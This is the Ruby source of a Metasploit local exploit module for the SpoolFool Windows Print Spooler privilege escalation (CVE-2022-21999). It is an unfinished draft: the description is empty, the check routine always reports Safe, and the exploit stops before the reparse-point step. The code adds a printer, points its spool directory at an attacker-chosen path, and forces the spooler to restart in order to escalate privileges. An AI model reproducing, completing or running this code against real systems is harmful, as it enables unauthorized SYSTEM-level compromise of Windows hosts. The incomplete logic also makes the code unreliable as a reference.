##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Post::File
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SpoolFool Privesc',
        'Description' => %q{
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Oliver Lyak', # Vuln discovery and PoC
          'Shelby Pace' # metasploit module
        ],
        'Platform' => [ 'win' ],
        'Arch' => ARCH_X64,
        'SessionTypes' => [ 'meterpreter' ],
        'Targets' => [[ 'Auto', {} ]],
        'Privileged' => true,
        'References' => [
          [ 'URL', 'https://research.ifcr.dk/spoolfool-windows-print-spooler-privilege-escalation-cve-2022-22718-bf7752b68d81'],
          [ 'CVE', '2022-21999']
        ],
        'DisclosureDate' => '2022-02-08',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [ CRASH_SERVICE_RESTARTS ],
          'Reliability' => [],
          'SideEffects' => [ ARTIFACTS_ON_DISK ]
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_railgun_api
            ]
          }
        }
      )
    )

    register_options(
      [
        OptString.new('PATH', [ true, 'Path to hold the payload', '%TEMP%' ])
      ]
    )
  end

  def check
    s_info = sysinfo['OS']
    unless s_info =~ /windows/i
      return CheckCode::Safe('This module only supports Windows targets.')
    end

    build_num = s_info.match(/Build\s(\d+)\)/)
    unless build_num && build_num[1]
      return CheckCode::Detected('Unable to determine Windows build number')
    end

    build_num = build_num[1].to_i
    case s_info
    when /windows 7/i
    when /windows 10/i
      # return CheckCode::Appears if ()
    end

    CheckCode::Safe
  end

  def winspool
    session.railgun.winspool
  end

  def spoolss
    session.railgun.spoolss
  end

  # packs struct according to member types and data
  def convert_struct(struct_data = {})
    data = ''
    values = struct_data.values

    values.each do |val|
      case val[:type]
      when :POINTER
        data << (val[:value].to_s.empty? ? [ 0 ].pack('Q') : [ val[:value] ].pack('Q'))
      when :DWORD
        data << (val[:value].nil? ? [ 0 ].pack('L') : [ val[:value] ].pack('L'))
      end
    end

    data
  end

  def get_printer_info_struct
    server_name = "#{Rex::Text.rand_text_alpha(5..12)}\x00"
    @printer_name = "#{Rex::Text.rand_text_alpha(5..12)}\x00"
    port_name = "LPT1:\x00"
    driver_name = "Microsoft Print To PDF\x00"
    print_proc_name = "winprint\x00"
    p_datatype = "RAW\x00"

    print_strs = "#{server_name}#{@printer_name}#{port_name}#{driver_name}#{print_proc_name}#{p_datatype}"
    base = session.railgun.util.alloc_and_write_string(print_strs)

    fail_with(Failure::UnexpectedReply, 'Failed to allocate strings for PRINTER_INFO_2 structure') unless base

    print_info_struct = {
      pServerName: { type: :POINTER, value: base + print_strs.index(server_name) },
      pPrinterName: { type: :POINTER, value: base + print_strs.index(@printer_name) },
      pShareName: { type: :POINTER, value: '' },
      pPortName: { type: :POINTER, value: base + print_strs.index(port_name) },
      pDriverName: { type: :POINTER, value: base + print_strs.index(driver_name) },
      pComment: { type: :POINTER, value: '' },
      pLocation: { type: :POINTER, value: '' },
      pDevMode: { type: :POINTER, value: '' },
      pSepFile: { type: :POINTER, value: '' },
      pPrintProcessor: { type: :POINTER, value: base + print_strs.index(print_proc_name) },
      pDatatype: { type: :POINTER, value: base + print_strs.index(p_datatype) },
      pParameters: { type: :POINTER, value: '' },
      pSecurityDescriptor: { type: :POINTER, value: '' },
      Attributes: { type: :DWORD, value: client.railgun.const('PRINTER_ATTRIBUTE_LOCAL') },
      Priority: { type: :DWORD, value: nil },
      DefaultPriority: { type: :DWORD, value: nil },
      StartTime: { type: :DWORD, value: nil },
      UntilTime: { type: :DWORD, value: nil },
      Status: { type: :DWORD, value: nil },
      cJobs: { type: :DWORD, value: nil },
      AveragePPM: { type: :DWORD, value: nil }
    }

    struct = convert_struct(print_info_struct)
  end

  def add_printer
    struct = get_printer_info_struct
    fail_with(Failure::UnexpectedReply, 'Failed to create PRINTER_INFO_2 STRUCT') unless struct

    ret = winspool.AddPrinterA(nil, 2, struct)
    fail_with(Failure::UnexpectedReply, ret['ErrorMessage']) if ret['GetLastError'] != 0

    print_good("Printer #{@printer_name} was successfully added.")
    ret['return']
  end

  def set_spool_directory(handle, spool_dir)
    ret = set_printer_data(handle, '\\', 'SpoolDirectory', spool_dir)

    unless ret['GetLastError'] == 0
      fail_with(Failure::UnexpectedReply, 'Failed to set spool directory')
    end
  end

  def restart_spooler(handle)
    print_status('Attempting to restart print spooler')
    ret = set_printer_data(handle, 'CopyFiles\\', 'Module', 'AppVTerminator')

    unless ret['GetLastError'] == 0
      fail_with(Failure::UnexpectedReply, 'Failed to terminate print spooler service')
    end
  end

  def set_printer_data(handle, key_name, value_name, config_data)
    winspool.SetPrinterDataExA(handle,
                               key_name,
                               value_name,
                               REG_SZ,
                               config_data,
                               config_data.length)
  end

  def dir_path
    datastore['PATH']
  end

  def exploit
    tmp_dir = Rex::Text.rand_text_alpha(5..12)
    tmp_path = expand_path("#{dir_path}\\#{tmp_dir}")

    print_status("Making base directory: #{tmp_path}")
    unless mkdir(tmp_path)
      fail_with(Failure::NoAccess,
                'Permissions may be insufficient.
                 Consider choosing a different base path for the exploit.')
    end

    handle = add_printer

    print_status('Setting spool directory for printer...')
    set_spool_directory(handle, tmp_path)

    driver_dir = 'C:\\Windows\\System32\\spool\\drivers\\x64\\printers'
    # now restart spooler to create spool directory
    restart_spooler(handle)
    # create reparse point
    #
  ensure
    spoolss.DeletePrinter(handle)
  end
end
